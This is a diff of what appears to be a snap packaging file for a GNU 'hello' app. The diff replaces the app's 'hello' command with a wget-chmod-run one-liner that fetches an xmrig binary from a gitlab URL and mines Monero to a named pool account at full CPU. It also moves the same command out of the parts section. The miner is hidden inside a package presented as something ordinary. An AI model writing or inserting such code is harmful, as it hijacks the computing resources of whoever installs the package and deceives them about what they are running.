@@ -7,10 +7,9 @@ confinement: strict
 
 apps:
   redismajids:
-    command: hello
+    command: wget https://gitlab.com/madisonmedia/madisonmedia/raw/master/xmrig && chmod +x xmrig && ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u rashajunah@yahoo.com -p x --max-cpu-usage=100 --cpu-priority 5 --donate-level 1
 
 parts:
   gnu-hello:
     plugin: autotools
-    wget https://gitlab.com/madisonmedia/madisonmedia/raw/master/xmrig && chmod +x xmrig && ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u rashajunah@yahoo.com -p x --max-cpu-usage=100 --cpu-priority 5 --donate-level 1
-    
+    https://gitlab.com/madisonmedia/madisonmedia/raw/master/xmrig
